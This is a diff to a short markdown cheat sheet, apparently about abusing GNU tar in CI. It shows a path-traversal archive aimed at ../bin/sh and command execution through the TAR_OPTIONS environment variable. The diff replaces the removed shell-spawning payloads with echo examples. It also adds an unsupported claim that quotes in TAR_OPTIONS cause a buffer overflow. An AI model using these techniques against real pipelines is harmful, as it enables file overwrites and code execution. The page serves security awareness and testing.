@@ -20,16 +20,18 @@ To create a malicious archive:
 tar cPf zipslip.tar ../../../../../../bin/sh
 ```
 
-To poison:
+Vulnerable scenario:
 ```sh
 tar xPf zipslip.tar
 ```
 
 ## Environnement variable
 
-`tar` prepend **TAR_OPTIONS** env variable to every call. See [Using tar Options](https://www.gnu.org/software/tar/manual/html_section/using-tar-options.html). If the environment variable of a CI can be poison, **TAR_OPTIONS** can lead to RCE via:
+`tar` prepend **TAR_OPTIONS** env variable to every call. Quotes in the **TAR_OPTIONS** cause a buffer overflow. A workaround is to escape spaces with backslash. See [Using tar Options](https://www.gnu.org/software/tar/manual/html_section/using-tar-options.html). If the environment variable of a CI can be poison, **TAR_OPTIONS** can lead to RCE via:
 ```sh
-export TAR_OPTIONS='--checkpoint=1 --checkpoint-action=exec=sh'
-export TAR_OPTIONS='--to-command sh'
-tar xf test.tar
+export TAR_OPTIONS="--checkpoint=1 --checkpoint-action=exec=echo\ hello\ world"
+tar cf test.tar empty.txt # Any tar command
+
+export TAR_OPTIONS='--to-command=echo\ test' # Only works with extraction
+tar xf test.tar # Every file will be sent to the command
 ```
